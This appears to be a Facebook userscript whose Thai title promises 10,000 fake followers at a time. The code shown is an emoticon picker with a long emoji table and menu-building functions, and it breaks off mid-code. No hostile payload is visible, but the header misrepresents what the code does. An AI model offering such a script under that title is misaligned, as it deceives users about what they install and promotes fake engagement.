﻿// ==UserScript==
// @name            เพิ่มผู้ติดตาม Fake Facebook ครั้งละ 10000 (ต้องการยืนยัน?)
// @description     Facebook By AutoFollowFree10000s 
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

